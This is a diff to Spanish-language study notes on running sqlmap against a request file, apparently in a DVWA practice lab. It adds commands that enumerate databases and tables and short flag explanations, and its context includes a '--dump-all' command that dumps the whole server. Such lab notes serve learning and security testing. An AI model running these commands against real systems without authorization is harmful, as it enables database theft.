@@ -27,7 +27,19 @@ Vaciado total del servidor:
 sqlmap -r request.txt --batch --dump-all
 ```
 
-El archivo `request.txt` lo tendremos que crear nosotros, en el incluiremos la REQUEST que hace la aplicación al servidor.
+Averiguar nombres de bases de datos:
+
+```
+sqlmap -r request.txt --dbs
+```
+
+Averiguar los nombres de las tablas de una base de datos:
+
+```
+sqlmap -r request.txt --batch -D dvwa --tables
+```
+
+El archivo `request.txt` lo tendremos que crear nosotros, en el incluiremos la REQUEST que hace la aplicación al servidor. 
 
 ![[Pasted image 20260127230029.png]]
 
@@ -38,4 +50,6 @@ El archivo `request.txt` lo tendremos que crear nosotros, en el incluiremos la R
 - `-D` -> Define la base de datos objetivo.
 - `-T` -> Define la tabla objetivo.
 - `-C` -> Define las columnas específicas.
+- `--dbs` -> Para enumerar las bases de datos.
+- `--tables` -> Para enumerar las tablas.
 - `--dump` -> Comando para descargar la información.
